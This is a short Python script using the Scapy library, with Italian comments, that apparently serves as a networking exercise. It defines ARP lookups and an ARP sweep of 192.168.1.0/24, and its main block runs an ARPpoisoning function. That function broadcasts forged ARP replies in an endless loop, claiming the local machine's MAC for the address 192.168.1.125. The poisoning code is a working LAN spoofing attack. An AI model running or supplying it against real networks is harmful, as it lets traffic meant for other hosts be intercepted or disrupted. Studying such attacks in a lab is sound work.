from scapy.all import *
import re, uuid

def MACfromIP(): #1
   #creo arp per mac da indirizzo ip
   answ, notansw = srp(Ether()/ARP(op=1,pdst="192.168.1.1"),timeout=2,verbose=False)

   for snd,rcv in answ:
    print("MAC: "+rcv[Ether].src)

   cont=0
   for snd in notansw:
    print(notansw[0])
    cont+=1

def ARPtoRange():
    #senza timeout run infinito
    asw, notansw = srp( Ether() / ARP(pdst="192.168.1.0/24",op=1) , timeout=2)  #op=1 arp request, can i have your MAC?

    for snd, rcv in asw:
        print("IP: " + rcv.psrc + " MAC: " + rcv.hwsrc)

def ARPpoisoning():
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,pdst="192.168.1.1",hwdst="ff:ff:ff:ff:ff:ff",
    psrc="192.168.1.125",hwsrc=(':'.join(re.findall('..', '%012x' % uuid.getnode())))),
    loop=1) #op=2 reply



if __name__ == "__main__":
    #MACfromIP()
    #ARPtoRange()
    ARPpoisoning()